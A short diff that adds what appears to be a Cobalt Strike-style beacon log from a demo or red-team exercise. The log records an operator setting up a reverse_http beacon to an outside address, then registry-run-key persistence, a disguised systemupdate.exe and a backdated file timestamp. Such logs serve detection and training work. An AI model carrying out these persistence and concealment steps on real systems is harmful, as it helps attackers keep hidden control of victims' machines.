@@ -1,0 +1,13 @@
+10/23 19:09:32 UTC [metadata] 192.168.3.108 <- 192.168.3.108; computer: COMPUTER001; user: allison_powell *; process: update.exe; pid: 5788; os: Windows; version: 6.2; build: 9200; beacon arch: x64 (x64)
+10/23 19:10:43 UTC [input] <analyst01> jump user_persist COMPUTER001 demo
+10/23 19:10:43 UTC [task] <T1547.001> Tasked Beacon to jump to COMPUTER001 (windows/beacon_http/reverse_http (10.20.19.157:80)) via registry persistance
+10/23 19:10:44 UTC [task] <T1093> Tasked beacon to run .NET program: persist.exe -a
+10/23 19:11:29 UTC [checkin] host called home, sent: 411201 bytes
+10/23 19:11:29 UTC [output]
+received output:
+Writing C:\Windows\Tasks\systemupdate.exe
+Setting file timestamp to 2/6/2013 7:27:27 PM
+Adding registry value name: SystemUpdateServices
+Adding registry value data: C:\Windows\Tasks\systemupdate.exe
+
+
